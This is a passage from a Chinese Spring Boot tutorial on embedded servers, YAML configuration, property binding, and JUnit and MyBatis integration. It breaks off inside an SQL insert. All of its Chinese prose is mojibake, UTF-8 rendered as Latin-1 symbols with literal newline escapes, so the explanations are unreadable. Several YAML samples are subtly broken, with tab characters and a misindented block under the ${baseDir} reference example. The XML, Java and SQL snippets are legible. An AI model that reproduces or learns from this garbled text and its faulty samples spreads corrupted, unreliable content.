çš„æ˜¯ä»€ä¹ˆï¼Ÿå¯¹è±¡å‘€ï¼Œä¸€åˆ‡çš†å¯¹è±¡ï¼Œä¸‡ç‰©çš†å¯¹è±¡ã€‚é‚£tomcatè¿è¡Œèµ·æ¥å‘¢ï¼Ÿä¹Ÿæ˜¯å¯¹è±¡ã€‚\n\nâ€‹\tå¦‚æœæ˜¯å¯¹è±¡ï¼Œé‚£Springå®¹å™¨æ˜¯ç”¨æ¥ç®¡ç†å¯¹è±¡çš„ï¼ŒtomcatæœåŠ¡å™¨è¿è¡Œå…¶å®æ˜¯ä»¥å¯¹è±¡çš„å½¢å¼åœ¨Springå®¹å™¨ä¸­è¿è¡Œçš„ã€‚å…·ä½“è¿è¡Œçš„æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå…¶å®å°±æ˜¯ä¸Šå‰é¢æåˆ°çš„é‚£ä¸ªtomcatå†…åµŒæ ¸å¿ƒ\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>org.apache.tomcat.embed</groupId>\n        <artifactId>tomcat-embed-core</artifactId>\n        <version>9.0.52</version>\n        <scope>compile</scope>\n    </dependency>\n</dependencies>\n```\n\né‚£æ—¢ç„¶æ˜¯ä¸ªå¯¹è±¡ï¼Œå¦‚æœæŠŠè¿™ä¸ªå¯¹è±¡ä»Springå®¹å™¨ä¸­å»æ‰æ˜¯ä¸æ˜¯å°±æ²¡æœ‰webæœåŠ¡å™¨çš„åŠŸèƒ½å‘¢ï¼Ÿæ˜¯è¿™æ ·çš„ï¼Œé€šè¿‡ä¾èµ–æ’é™¤å¯ä»¥å»æ‰è¿™ä¸ªwebæœåŠ¡å™¨åŠŸèƒ½\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-web</artifactId>\n        <exclusions>\n            <exclusion>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-starter-tomcat</artifactId>\n            </exclusion>\n        </exclusions>\n    </dependency>\n</dependencies>\n```\n\né‡æ–°å¯åŠ¨ç¨‹åºå¯ä»¥è§‚å¯Ÿåˆ°ç¨‹åºè¿è¡Œäº†ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰åƒä¹‹å‰é‚£æ ·è¿è¡Œåä¼šç­‰ç€ç”¨æˆ·å‘è¯·æ±‚ï¼Œè€Œæ˜¯ç›´æ¥åœæ‰äº†ã€‚\n\n**æ›´æ¢å†…åµŒTomcat**\n\næ ¹æ®SpringBootçš„å·¥ä½œæœºåˆ¶ï¼Œç”¨ä»€ä¹ˆæŠ€æœ¯ï¼ŒåŠ å…¥ä»€ä¹ˆä¾èµ–å°±è¡Œäº†ã€‚SpringBootæä¾›äº†3æ¬¾å†…ç½®çš„æœåŠ¡å™¨\n\n- tomcat(é»˜è®¤)ï¼šapacheå‡ºå“ï¼Œç²‰ä¸å¤šï¼Œåº”ç”¨é¢å¹¿ï¼Œè´Ÿè½½äº†è‹¥å¹²è¾ƒé‡çš„ç»„ä»¶\n\n- jettyï¼šæ›´è½»é‡çº§ï¼Œè´Ÿè½½æ€§èƒ½è¿œä¸åŠtomcat\n\n- undertowï¼šè´Ÿè½½æ€§èƒ½å‹‰å¼ºè·‘èµ¢tomcat\n\n\næƒ³ç”¨å“ªä¸ªï¼ŒåŠ ä¸ªåæ ‡å°±OKã€‚å‰ææ˜¯æŠŠtomcatæ’é™¤æ‰ï¼Œå› ä¸ºtomcatæ˜¯é»˜è®¤åŠ è½½çš„ã€‚\n\n```xml\n<dependencies>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-web</artifactId>\n        <exclusions>\n            <exclusion>\n                <groupId>org.springframework.boot</groupId>\n                <artifactId>spring-boot-starter-tomcat</artifactId>\n            </exclusion>\n        </exclusions>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-jetty</artifactId>\n    </dependency>\n</dependencies>\n```\n\nç°åœ¨å°±å·²ç»æˆåŠŸæ›¿æ¢äº†webæœåŠ¡å™¨ï¼Œæ ¸å¿ƒæ€æƒ³å°±æ˜¯ç”¨ä»€ä¹ˆåŠ å…¥å¯¹åº”åæ ‡å°±å¯ä»¥äº†ã€‚å¦‚æœæœ‰starterï¼Œä¼˜å…ˆä½¿ç”¨starterã€‚\n\n**æ€»ç»“**\n\n1. å†…åµŒTomcatæœåŠ¡å™¨æ˜¯SpringBootè¾…åŠ©åŠŸèƒ½ä¹‹ä¸€\n2. å†…åµŒTomcatå·¥ä½œåŸç†æ˜¯å°†TomcatæœåŠ¡å™¨ä½œä¸ºå¯¹è±¡è¿è¡Œï¼Œå¹¶å°†è¯¥å¯¹è±¡äº¤ç»™Springå®¹å™¨ç®¡ç†\n3. å˜æ›´å†…åµŒæœåŠ¡å™¨æ€æƒ³æ˜¯å»é™¤ç°æœ‰æœåŠ¡å™¨ï¼Œæ·»åŠ å…¨æ–°çš„æœåŠ¡å™¨\n\n# ä¸‰ã€åŸºç¡€é…ç½®\n\n## 1.å±æ€§é…ç½®\n\nSpringBoot é€šè¿‡ resources ç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶ `application.properties` å°±å¯ä»¥ä¿®æ”¹é»˜è®¤çš„é…ç½®\n\nä¾‹å¦‚ å°† tomcat çš„é»˜è®¤ç«¯å£8080æ”¹æˆ80ï¼Œè¾“å…¥portåï¼Œè‡ªå¸¦æç¤ºå¸¦æç¤º\n\n```properties\nserver.port=80\n```\n\né‡æ–°è¿è¡Œï¼Œæµè§ˆå™¨è¾“å…¥`http://localhost`å³å¯\n\nè¿™ä¸ªé…ç½®é¡¹å’Œä»€ä¹ˆæœ‰å…³ï¼Ÿåœ¨pomä¸­æ³¨é‡Šæ‰å¯¼å…¥çš„spring-boot-starter-webï¼Œç„¶ååˆ·æ–°å·¥ç¨‹ï¼Œä½ ä¼šå‘ç°é…ç½®çš„æç¤ºæ¶ˆå¤±äº†ã€‚é—¹äº†åŠå¤©æ˜¯è®¾å®šä½¿ç”¨äº†ä»€ä¹ˆæŠ€æœ¯æ‰èƒ½åšä»€ä¹ˆé…ç½®ã€‚\n\næ›´å¤šé…ç½®é¡¹è¯·å‚è€ƒï¼š[Common Application Properties](https://docs.spring.io/spring-boot/docs/current/reference/html/application-properties.html#appendix.application-properties)\n\n**æ€»ç»“**\n\n1. SpringBootä¸­å¯¼å…¥å¯¹åº”starteråï¼Œæä¾›å¯¹åº”é…ç½®å±æ€§\n2. ä¹¦å†™SpringBooté…ç½®é‡‡ç”¨å…³é”®å­—+æç¤ºå½¢å¼ä¹¦å†™\n\n## 2.é…ç½®æ–‡ä»¶åˆ†ç±»\n\nSpringBooté™¤äº†æ”¯æŒpropertiesæ ¼å¼çš„é…ç½®æ–‡ä»¶ï¼Œè¿˜æ”¯æŒå¦å¤–ä¸¤ç§æ ¼å¼çš„é…ç½®æ–‡ä»¶ã€‚åˆ†åˆ«å¦‚ä¸‹:\n\n- propertiesæ ¼å¼\n\n```properties\nserver.port=80\n```\n\n- ymlæ ¼å¼ï¼ˆ`æ¨èä½¿ç”¨`ï¼‰\n\n```yaml\nserver:\n  port: 81\n```\n\n- yamlæ ¼å¼\n\n```yaml\nserver:\n  port: 82\n```\n\nyml æ ¼å¼å’Œ yaml æ ¼å¼é™¤äº†æ–‡ä»¶ååç¼€ä¸ä¸€æ ·ï¼Œæ ¼å¼å®Œå…¨ä¸€æ ·ï¼Œæ‰€ä»¥å¯ä»¥åˆå¹¶æˆä¸€ç§æ ¼å¼æ¥çœ‹ã€‚\n\n- ä¸‰ç§æ ¼å¼ä¸­æ¨èä½¿ç”¨ yml æ ¼å¼\n- é…ç½®æ–‡ä»¶é—´çš„åŠ è½½ä¼˜å…ˆçº§\tpropertiesï¼ˆæœ€é«˜ï¼‰>  yml  >  yamlï¼ˆæœ€ä½ï¼‰\n- ä¸åŒé…ç½®æ–‡ä»¶ä¸­ç›¸åŒé…ç½®æŒ‰ç…§åŠ è½½ä¼˜å…ˆçº§ç›¸äº’è¦†ç›–ï¼Œä¸åŒé…ç½®æ–‡ä»¶ä¸­ä¸åŒé…ç½®å…¨éƒ¨ä¿ç•™ \n\n## 3.yamlæ–‡ä»¶æ ¼å¼\n\nYAMLï¼ˆYAML Ain't Markup Languageï¼‰ æ˜¯ä¸€ç§è¾ƒä¸ºäººæ€§åŒ–çš„**æ•°æ®åºåˆ—åŒ–è¯­è¨€** ï¼Œè¯­æ³•æ¯”è¾ƒç®€æ´ç›´è§‚ï¼Œç‰¹ç‚¹æ˜¯ä½¿ç”¨ç©ºæ ¼æ¥è¡¨è¾¾å±‚æ¬¡ç»“æ„ï¼Œå…¶æœ€å¤§ä¼˜åŠ¿åœ¨äº**æ•°æ®ç»“æ„**æ–¹é¢çš„è¡¨è¾¾ï¼Œæ‰€ä»¥ YAML æ›´å¤šåº”ç”¨äº**ç¼–å†™é…ç½®æ–‡ä»¶**ï¼Œå…¶æ–‡ä»¶ä¸€èˆ¬ä»¥ **.yml** ä¸ºåç¼€ã€‚\n\nyaml éå¸¸é€‚åˆç”¨æ¥åšä»¥æ•°æ®ä¸ºä¸­å¿ƒçš„é…ç½®æ–‡ä»¶ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨ yaml ä»£æ›¿ä¹‹å‰çš„ properties\n\n### **â‘ åŸºæœ¬è¯­æ³•**\n\n- key: value    \n  - â€œ`:`â€åæœ‰ç©ºæ ¼\n- å¤§å°å†™æ•æ„Ÿ\n- ä½¿ç”¨ç¼©è¿›è¡¨ç¤ºå±‚çº§å…³ç³»\n- ç¼©è¿›ä¸å…è®¸ä½¿ç”¨ tabï¼Œåªå…è®¸ç©ºæ ¼\n- ç¼©è¿›çš„ç©ºæ ¼æ•°ä¸é‡è¦ï¼Œåªè¦ç›¸åŒå±‚çº§çš„å…ƒç´ å·¦å¯¹é½å³å¯\n- '#'è¡¨ç¤ºæ³¨é‡Š\n- å­—ç¬¦ä¸²æ— éœ€åŠ å¼•å·ï¼Œå¦‚æœè¦åŠ ï¼š\n  - åŒå¼•å·è¡¨ç¤ºå­—ç¬¦ä¸²å†…å®¹ä¼šè¢«è½¬ä¹‰\n  - å•å¼•å·è¡¨ç¤ºå­—ç¬¦ä¸²å†…å®¹ä¸ä¼šè¢«è½¬ä¹‰\n\n**æ•°æ®ç±»å‹**\n\n- æ™®é€šæ•°æ®ï¼šå•ä¸ªçš„ã€ä¸å¯å†åˆ†çš„å€¼ã€‚dateã€booleanã€stringã€numberã€null\n\n```yaml\nk: v\n```\n\n- å¯¹è±¡ï¼šé”®å€¼å¯¹çš„é›†åˆã€‚mapã€hashã€setã€object \n\n```yaml\nè¡Œå†…å†™æ³•ï¼š  k: {k1:v1,k2:v2,k3:v3}\n#æˆ–\nk: \n\tk1: v1\n  k2: v2\n  k3: v3\n```\n\n- æ•°ç»„ï¼šä¸€ç»„æŒ‰æ¬¡åºæ’åˆ—çš„å€¼ã€‚arrayã€listã€queue\n\n```yaml\nè¡Œå†…å†™æ³•ï¼š  k: [v1,v2,v3]\n#æˆ–\nk:\n - v1\n - v2\n - v3\n \nusers:\t\t\t\t\t\t\t #å¯¹è±¡æ•°ç»„æ ¼å¼\n  - name: Tom\n   \tage: 4\n  - name: Jerry\n    age: 5\t\t    \nusers2: [ { name:Tom , age:4 } , { name:Jerry , age:5 } ]\t#å¯¹è±¡æ•°ç»„ç¼©ç•¥æ ¼å¼\n```\n\n**ç¤ºä¾‹**\n\n```java\n@Data\npublic class Person {\n\t\n\tprivate String userName;\n\tprivate Boolean boss;\n\tprivate Date birth;\n\tprivate Integer age;\n\tprivate Pet pet;\n\tprivate String[] interests;\n\tprivate List<String> animal;\n\tprivate Map<String, Object> score;\n\tprivate Set<Double> salarys;\n\tprivate Map<String, List<Pet>> allPets;\n}\n\n@Data\npublic class Pet {\n\tprivate String name;\n\tprivate Double weight;\n}\n```\n\n```yaml\n# yamlè¡¨ç¤ºä»¥ä¸Šå¯¹è±¡\nperson:\n  userName: zhangsan\n  boss: false\n  birth: 2019/12/12 20:12:33\n  age: 18\n  pet: \n    name: tomcat\n    weight: 23.4\n  interests: [ç¯®çƒ,æ¸¸æ³³]\n  animal: \n    - jerry\n    - mario\n  score:\n    english: \n      first: 30\n      second: 40\n      third: 50\n    math: [131,140,148]\n    chinese: {first: 128,second: 136}\n  salarys: [3999,4999.98,5999.99]\n  allPets:\n    sick:\n      - {name: tom}\n      - {name: jerry,weight: 47}\n    health: [{name: mario,weight: 47}]\n```\n\n### â‘¡æ•°æ®å¼•ç”¨\n\nå¦‚æœä½ åœ¨ä¹¦å†™yamlæ•°æ®æ—¶ï¼Œç»å¸¸å‡ºç°å¦‚ä¸‹ç°è±¡ï¼Œæ¯”å¦‚å¾ˆå¤šä¸ªæ–‡ä»¶éƒ½å…·æœ‰ç›¸åŒçš„ç›®å½•å‰ç¼€\n\n```yaml\ncenter:\n\tdataDir: /usr/local/fire/data\n    tmpDir: /usr/local/fire/tmp\n    logDir: /usr/local/fire/log\n    msgDir: /usr/local/fire/msgDir\n```\n\næˆ–è€…\n\n```yaml\ncenter:\n\tdataDir: D:/usr/local/fire/data\n    tmpDir: D:/usr/local/fire/tmp\n    logDir: D:/usr/local/fire/log\n    msgDir: D:/usr/local/fire/msgDir\n```\n\nâ€‹\tè¿™ä¸ªæ—¶å€™ä½ å¯ä»¥ä½¿ç”¨å¼•ç”¨æ ¼å¼æ¥å®šä¹‰æ•°æ®ï¼Œå…¶å®å°±æ˜¯æäº†ä¸ªå˜é‡åï¼Œç„¶åå¼•ç”¨å˜é‡äº†ï¼Œæ ¼å¼å¦‚ä¸‹ï¼š\n\n```yaml\nbaseDir: /usr/local/fire\n\tcenter:\n    dataDir: ${baseDir}/data\n    tmpDir: ${baseDir}/tmp\n    logDir: ${baseDir}/log\n    msgDir: ${baseDir}/msgDir\n```\n\nè¿˜æœ‰ä¸€ä¸ªæ³¨æ„äº‹é¡¹ï¼Œåœ¨ä¹¦å†™å­—ç¬¦ä¸²æ—¶ï¼Œå¦‚æœéœ€è¦ä½¿ç”¨è½¬ä¹‰å­—ç¬¦ï¼Œéœ€è¦å°†æ•°æ®å­—ç¬¦ä¸²ä½¿ç”¨åŒå¼•å·åŒ…è£¹èµ·æ¥\n\n```yaml\nlesson: \"Spring\\tboot\\nlesson\"\n```\n\n**æ€»ç»“**\n\n1. åœ¨é…ç½®æ–‡ä»¶ä¸­å¯ä»¥ä½¿ç”¨${å±æ€§å}æ–¹å¼å¼•ç”¨å±æ€§å€¼\n2. å¦‚æœå±æ€§ä¸­å‡ºç°ç‰¹æ®Šå­—ç¬¦ï¼Œå¯ä»¥ä½¿ç”¨åŒå¼•å·åŒ…è£¹èµ·æ¥ä½œä¸ºå­—ç¬¦è§£æ\n\n## 4.yamlæ•°æ®è¯»å–\n\n### â‘ è¯»å–å•ä¸€æ•°æ®\n\nâ€‹\tyamlä¸­ä¿å­˜çš„å•ä¸ªæ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨Springä¸­çš„æ³¨è§£ç›´æ¥è¯»å–ï¼Œä½¿ç”¨`@Value`å¯ä»¥è¯»å–å•ä¸ªæ•°æ®ï¼Œå±æ€§åå¼•ç”¨æ–¹å¼ï¼š<font color=\"#ff0000\"><b>${ä¸€çº§å±æ€§å.äºŒçº§å±æ€§åâ€¦â€¦}</b></font>\n\n<img src=\"https://img.jwt1399.top/img/202209062142453.png\" style=\"zoom:80%;\" />\n\n**æ€»ç»“**\n\n1. ä½¿ç”¨@Valueè¯»å–å•ä¸ªæ•°æ®\n2. å¦‚æœæ•°æ®å­˜åœ¨å¤šå±‚çº§ï¼Œä¾æ¬¡ä¹¦å†™å±‚çº§åç§°å³å¯\n\n### â‘¡è¯»å–å…¨éƒ¨æ•°æ®\n\nâ€‹\tè¯»å–å•ä¸€æ•°æ®å¯ä»¥è§£å†³è¯»å–æ•°æ®çš„é—®é¢˜ï¼Œä½†æ˜¯å¦‚æœå®šä¹‰çš„æ•°æ®é‡è¿‡å¤§ï¼Œè¿™ä¹ˆä¸€ä¸ªä¸€ä¸ªä¹¦å†™è‚¯å®šä¼šç´¯æ­»äººçš„ï¼ŒSpringBootæä¾›äº†ä¸€ä¸ªå¯¹è±¡ï¼Œèƒ½å¤ŸæŠŠæ‰€æœ‰çš„æ•°æ®éƒ½å°è£…åˆ°è¿™ä¸€ä¸ªå¯¹è±¡ä¸­ï¼Œè¿™ä¸ªå¯¹è±¡å«åšEnvironmentï¼Œä½¿ç”¨è‡ªåŠ¨è£…é…æ³¨è§£ @Autowired å¯ä»¥å°†æ‰€æœ‰çš„yamlæ•°æ®å°è£…åˆ°è¿™ä¸ªå¯¹è±¡ä¸­\n\n<img src=\"https://img.jwt1399.top/img/202209062148870.png\" style=\"zoom:80%;\" />\n\næ•°æ®å°è£…åˆ°äº†Environmentå¯¹è±¡ä¸­ï¼Œé€šè¿‡æ–¹æ³• **getProperty(\"å±æ€§å\")** è·å–æ•°æ®\n\n**æ€»ç»“**\n\n1. ä½¿ç”¨Environmentå¯¹è±¡å°è£…å…¨éƒ¨é…ç½®ä¿¡æ¯\n2. ä½¿ç”¨@Autowiredè‡ªåŠ¨è£…é…æ•°æ®åˆ°Environmentå¯¹è±¡ä¸­\n\n### â‘¢è¯»å–å¯¹è±¡æ•°æ®\n\nå•ä¸€æ•°æ®è¯»å–ä¹¦å†™æ¯”è¾ƒç¹çï¼Œå…¨æ•°æ®å°è£…åˆå°è£…çš„å¤ªå‰å®³äº†ï¼Œæ¯æ¬¡æ‹¿æ•°æ®è¿˜è¦ä¸€ä¸ªä¸€ä¸ªçš„ getProperty() ï¼Œæ€»ä¹‹ç”¨èµ·æ¥éƒ½ä¸æ˜¯å¾ˆèˆ’æœã€‚ç”±äºJavaæ˜¯ä¸€ä¸ªé¢å‘å¯¹è±¡çš„è¯­è¨€ï¼Œå¾ˆå¤šæƒ…å†µä¸‹ï¼Œæˆ‘ä»¬ä¼šå°†ä¸€ç»„æ•°æ®å°è£…æˆä¸€ä¸ªå¯¹è±¡ã€‚SpringBootä¹Ÿæä¾›äº†å¯ä»¥å°†ä¸€ç»„yamlå¯¹è±¡æ•°æ®å°è£…ä¸€ä¸ªJavaå¯¹è±¡çš„æ“ä½œ\n\nâ€‹\té¦–å…ˆå®šä¹‰ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å°†è¯¥å¯¹è±¡çº³å…¥Springç®¡æ§çš„èŒƒå›´ï¼Œä¹Ÿå°±æ˜¯å®šä¹‰æˆä¸€ä¸ªbeanï¼Œç„¶åä½¿ç”¨æ³¨è§£`@ConfigurationProperties(prefix = \"æ•°æ®å‰ç¼€\")`  æŒ‡å®šè¯¥å¯¹è±¡åŠ è½½å“ªä¸€ç»„yamlä¸­é…ç½®çš„ä¿¡æ¯ã€‚\n\n<img src=\"https://img.jwt1399.top/img/202209062150640.png\"  style=\"zoom:80%;\" />\n\n@ConfigurationProperties å¿…é¡»æŒ‡å®šåŠ è½½çš„æ•°æ®å‰ç¼€æ˜¯ä»€ä¹ˆï¼Œè¿™æ ·å½“å‰å‰ç¼€ä¸‹çš„æ‰€æœ‰å±æ€§å°±å°è£…åˆ°è¿™ä¸ªå¯¹è±¡ä¸­ã€‚è®°å¾—æ•°æ®å±æ€§åè¦ä¸å¯¹è±¡çš„å˜é‡åä¸€ä¸€å¯¹åº”ï¼Œä¸ç„¶æ²¡æ³•å°è£…ã€‚å…¶å®ä»¥åå¦‚æœä½ è¦å®šä¹‰ä¸€ç»„æ•°æ®è‡ªå·±ä½¿ç”¨ï¼Œå°±å¯ä»¥å…ˆå†™ä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åå®šä¹‰å¥½å±æ€§ï¼Œä¸‹é¢åˆ°é…ç½®ä¸­æ ¹æ®è¿™ä¸ªæ ¼å¼ä¹¦å†™å³å¯ã€‚\n\n<img src=\"https://img.jwt1399.top/img/202209062151985.png\" style=\"zoom:80%;\" />\n\n**æ€»ç»“**\n\n1. ä½¿ç”¨@ConfigurationPropertiesæ³¨è§£ç»‘å®šé…ç½®ä¿¡æ¯åˆ°å°è£…ç±»ä¸­\n2. å°è£…ç±»éœ€è¦å®šä¹‰ä¸ºSpringç®¡ç†çš„beanï¼Œå¦åˆ™æ— æ³•è¿›è¡Œå±æ€§æ³¨å…¥\n\nâ€‹\t<font color=\"#f0f\"><b>æ¸©é¦¨æç¤º</b></font>\n\nâ€‹\t\tç»†å¿ƒçš„å°ä¼™ä¼´ä¼šå‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œè‡ªå®šä¹‰çš„è¿™ç§æ•°æ®åœ¨yamlæ–‡ä»¶ä¸­ä¹¦å†™æ—¶æ²¡æœ‰å¼¹å‡ºæç¤ºï¼Œè§£å†³æ–¹æ³•å¦‚ä¸‹ã€‚\n\n### â‘£é…ç½®æç¤ºæ•ˆæœ\n\n> é…ç½®æç¤º configuration-processor\n\nè‡ªå®šä¹‰çš„ç±»å’Œé…ç½®æ–‡ä»¶ç»‘å®šä¸€èˆ¬æ²¡æœ‰æç¤ºã€‚è‹¥è¦æç¤ºï¼Œæ·»åŠ å¦‚ä¸‹ä¾èµ–ï¼š\n\n```xml\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-configuration-processor</artifactId>\n  <optional>true</optional>\n</dependency>\n\n<build>\n  <plugins>\n    <plugin>\n      <configuration>\n        <excludes>\n          <exclude>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-configuration-processor</artifactId>\n          </exclude>\n        </excludes>\n      </configuration>\n    </plugin>\n  </plugins>\n</build>\n```\n\nå†åœ¨è‡ªå®šä¹‰çš„ç±»ä¸Šæ·»åŠ é…ç½®æ³¨è§£\n\n```java\n@ConfigurationProperties(prefix = \"xxx\")//è¯»å–æ–‡ä»¶ä¸­æ‰€æœ‰ä»¥xxxå¼€å¤´çš„å±æ€§ï¼Œå¹¶å’Œbeanä¸­çš„å­—æ®µè¿›è¡ŒåŒ¹é…\n@Component //æ ‡æ³¨ç±»ä¸ºSpringå®¹å™¨çš„Bean\n```\n\næµ‹è¯•\n\n```java\n@ConfigurationProperties(prefix = \"user\")\n@Component //æ ‡æ³¨ç±»ä¸ºSpringå®¹å™¨çš„Bean\n@NoArgsConstructor //æ— å‚æ„é€ \n@AllArgsConstructor //æœ‰å‚æ„é€ \n@Data\n@EqualsAndHashCode\npublic class User {\n   private String name;\n   private Integer age;\n}\n```\n\nåœ¨é…ç½®æ–‡ä»¶ application.yml ä¸­è¾“å…¥ user å°±ä¼šå¾—åˆ° name å’Œ age çš„è¾“å…¥æç¤º\n\n# å››ã€æ•´åˆæŠ€æœ¯\n\næ•´åˆç¬¬ä¸‰æ–¹æŠ€æœ¯é€šç”¨æ–¹å¼\n\n- å¯¼å…¥å¯¹åº”çš„starter\n- é…ç½®éé»˜è®¤å€¼å¯¹åº”çš„é…ç½®é¡¹\n\n## 1.æ•´åˆJUnit\n\n- å¯¼å…¥æµ‹è¯•å¯¹åº”çš„starterï¼Œåˆå§‹åŒ–é¡¹ç›®æ—¶æ­¤é¡¹æ˜¯é»˜è®¤å¯¼å…¥çš„\n\n```xml\n<dependency>\n  <groupId>org.springframework.boot</groupId>\n  <artifactId>spring-boot-starter-test</artifactId>\n  <scope>test</scope>\n</dependency>\n```\n\n- åœ¨æµ‹è¯•ç±»ä¸Šæ·»åŠ æ³¨è§£ @SpringBootTest ï¼Œåœ¨æ–¹æ³•ä¸Šæ·»åŠ æ³¨è§£ @Test\n\n```java\n@SpringBootTest\nclass SpringbootJunitTests {\n    //æ³¨å…¥ä½ è¦æµ‹è¯•çš„å¯¹è±¡\n    @Autowired\n    private BookDao bookDao;\n    @Test\n    void contextLoads() {\n        //æ‰§è¡Œè¦æµ‹è¯•çš„å¯¹è±¡å¯¹åº”çš„æ–¹æ³•\n        bookDao.save();\n        System.out.println(\"two...\");\n    }\n}\n```\n\n- æµ‹è¯•ç±»å¦‚æœå­˜åœ¨äºå¼•å¯¼ç±»æ‰€åœ¨åŒ…æˆ–å­åŒ…ä¸­æ— éœ€æŒ‡å®šå¼•å¯¼ç±»ï¼Œæµ‹è¯•ç±»å¦‚æœä¸å­˜åœ¨äºå¼•å¯¼ç±»æ‰€åœ¨çš„åŒ…æˆ–å­åŒ…ä¸­éœ€è¦é€šè¿‡classeså±æ€§æŒ‡å®šå¼•å¯¼ç±»\n\nç¬¬ä¸€ç§æ–¹å¼ä½¿ç”¨å±æ€§çš„å½¢å¼è¿›è¡Œï¼Œåœ¨æ³¨è§£ @SpringBootTest ä¸­æ·»åŠ  classes å±æ€§æŒ‡å®šé…ç½®ç±»\n\n```java\n@SpringBootTest(classes = SpringbootJunitApplication.class)\nclass SpringbootJunitApplicationTests {\n    //æ³¨å…¥ä½ è¦æµ‹è¯•çš„å¯¹è±¡\n    @Autowired\n    private BookDao bookDao;\n    @Test\n    void contextLoads() {\n        //æ‰§è¡Œè¦æµ‹è¯•çš„å¯¹è±¡å¯¹åº”çš„æ–¹æ³•\n        bookDao.save();\n        System.out.println(\"two...\");\n    }\n}\n```\n\nç¬¬äºŒç§æ–¹å¼å›å½’åŸå§‹é…ç½®æ–¹å¼ï¼Œä»ç„¶ä½¿ç”¨ @ContextConfiguration æ³¨è§£è¿›è¡Œï¼Œæ•ˆæœæ˜¯ä¸€æ ·çš„\n\n```java\n@SpringBootTest\n@ContextConfiguration(classes = SpringbootJunitApplication.class)\nclass SpringbootJunitApplicationTests {\n    //æ³¨å…¥ä½ è¦æµ‹è¯•çš„å¯¹è±¡\n    @Autowired\n    private BookDao bookDao;\n    @Test\n    void contextLoads() {\n        //æ‰§è¡Œè¦æµ‹è¯•çš„å¯¹è±¡å¯¹åº”çš„æ–¹æ³•\n        bookDao.save();\n        System.out.println(\"two...\");\n    }\n}\n```\n\n**æ€»ç»“**\n\n1. å¯¼å…¥æµ‹è¯•å¯¹åº”çš„starter\n2. æµ‹è¯•ç±»ä½¿ç”¨@SpringBootTestä¿®é¥°\n3. ä½¿ç”¨è‡ªåŠ¨è£…é…çš„å½¢å¼æ·»åŠ è¦æµ‹è¯•çš„å¯¹è±¡\n4. æµ‹è¯•ç±»å¦‚æœå­˜åœ¨äºå¼•å¯¼ç±»æ‰€åœ¨åŒ…æˆ–å­åŒ…ä¸­æ— éœ€æŒ‡å®šå¼•å¯¼ç±»\n5. æµ‹è¯•ç±»å¦‚æœä¸å­˜åœ¨äºå¼•å¯¼ç±»æ‰€åœ¨çš„åŒ…æˆ–å­åŒ…ä¸­éœ€è¦é€šè¿‡classeså±æ€§æŒ‡å®šå¼•å¯¼ç±»\n\n## 2.æ•´åˆMyBatis\n\n**æ­¥éª¤â‘ **ï¼šåˆ›å»ºæ¨¡å—æ—¶å‹¾é€‰è¦ä½¿ç”¨çš„æŠ€æœ¯ï¼ŒMyBatisï¼Œç”±äºè¦æ“ä½œæ•°æ®åº“ï¼Œè¿˜è¦å‹¾é€‰å¯¹åº”æ•°æ®åº“\n\n![](https://img.jwt1399.top/img/202209071920462.png)\n\næˆ–è€…æ‰‹å·¥å¯¼å…¥ MyBatis çš„ starter å’Œå¯¹åº”æ•°æ®åº“çš„åæ ‡\n\n```xml\n<dependency>\n    <groupId>org.mybatis.spring.boot</groupId>\n    <artifactId>mybatis-spring-boot-starter</artifactId>\n    <version>2.2.2</version>\n</dependency>\n\n<dependency>\n  <groupId>mysql</groupId>\n  <artifactId>mysql-connector-java</artifactId>\n  <scope>runtime</scope>\n</dependency>\n```\n\n**æ­¥éª¤â‘¡**ï¼šé…ç½®æ•°æ®æºç›¸å…³ä¿¡æ¯ï¼Œæ²¡æœ‰è¿™ä¸ªä¿¡æ¯ä½ è¿æ¥å“ªä¸ªæ•°æ®åº“éƒ½ä¸çŸ¥é“\n\n```yaml\nspring:\n  datasource:\n    driver-class-name: com.mysql.cj.jdbc.Driver\n    url: jdbc:mysql://localhost:3306/ssm_db?serverTimezone=Asia/Shanghai\n    username: root\n    password: root\n```\n\n**æµ‹è¯•**\n\n- æµ‹è¯•è¡¨\n\n```sql\nSET NAMES utf8;\nSET FOREIGN_KEY_CHECKS = 0;\n\n-- ----------------------------\n-- Table structure for tbl_book\n-- ----------------------------\nDROP TABLE IF EXISTS `tbl_book`;\nCREATE TABLE `tbl_book`  (\n  `id` int NOT NULL AUTO_INCREMENT,\n  `name` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `type` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  `description` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,\n  PRIMARY KEY (`id`) USING BTREE\n) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;\n\n-- ----------------------------\n-- Records of tbl_book\n-- ----------------------------\nINSERT INTO `tbl_book` VALUES (1, 'ä¸‰ä½“', 'ç§‘å¹»', 'å¤§åˆ˜çš„å·…å³°ä¹‹ä½œï¼Œå°†ä¸­å›½ç§‘å¹»æ¨å‘ä¸–ç•Œèˆå°ã€‚æ€»å…±åˆ†ä¸ºä¸‰éƒ¨æ›²ï¼šã€Šåœ°çƒå¾€äº‹ã€‹ã€ã€Šé»‘æš—æ£®æ—ã€‹ã€ã€Šæ­»ç¥æ°¸ç”Ÿã€‹ã€‚');\nINSERT INTO `tbl_book` VALUES (2, 'æ ¼æ—ç«¥è¯', 'ç«¥è¯', 'ç¡å‰æ•…äº‹ã€‚');\nINSERT INTO `tbl_book` VALUES (3, 'Spring 